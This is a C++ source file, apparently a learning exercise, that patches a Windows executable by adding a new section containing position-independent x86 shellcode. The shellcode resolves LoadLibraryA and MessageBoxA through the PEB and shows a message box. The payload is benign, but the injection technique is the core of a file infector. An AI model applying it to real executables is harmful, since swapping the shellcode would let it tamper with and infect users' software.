// MsgInject.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>
#include "PEHandler.h"

HANDLE GetPeHandle(const char* fn) {
    HANDLE fHandle = CreateFileA(fn, GENERIC_ALL, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
    if (fHandle == INVALID_HANDLE_VALUE) {
        std::cout << "Unable to create a handle to the provided file... " << GetLastError() << "\n";
        std::exit(-1);
    }
    return fHandle;
}

int main(int argc, char** argv)
{
    if (argc <= 1)
    {
        MessageBox(0, L"Please provide the required arguments...", L"Argument Error", MB_OK | MB_ICONERROR);
        return -1;
    }
    char msgShell[] = "\x31\xc9\x64\x8b\x41\x30\x8b\x40\xc\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x1\xda\x8b\x52\x78\x1\xda\x8b\x72\x20\x1\xde\x31\xc9\x41\xad\x1\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x4\x72\x6f\x63\x41\x75\xeb\x81\x78\x8\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x1\xde\x66\x8b\xc\x4e\x49\x8b\x72\x1c\x1\xde\x8b\x14\x8e\x1\xda\x31\xc9\x53\x52\x51\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd2\x83\xc4\xc\x59\x50\x51\x66\xb9\x6c\x6c\x51\x68\x33\x32\x2e\x64\x68\x75\x73\x65\x72\x54\xff\xd0\x83\xc4\x10\x8b\x54\x24\x4\xb9\x6f\x78\x41\x0\x51\x68\x61\x67\x65\x42\x68\x4d\x65\x73\x73\x54\x50\xff\xd2\x83\xc4\x10\x68\x61\x62\x63\x64\x83\x6c\x24\x3\x64\x89\xe6\x31\xc9\x51\x56\x56\x51\xff\xd0";
    HANDLE peHandle = GetPeHandle(argv[1]);
    PEHandler peInst = *(new PEHandler(0));
    PEHandler::GetInstance(peHandle, &peInst);
    peInst.CreateSection(".newx", msgShell, 184);
    MessageBox(0, L"Voila! Provided executable file is now patched.", L"Code is now injected...", MB_OK | MB_ICONINFORMATION);
    return 0;

}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
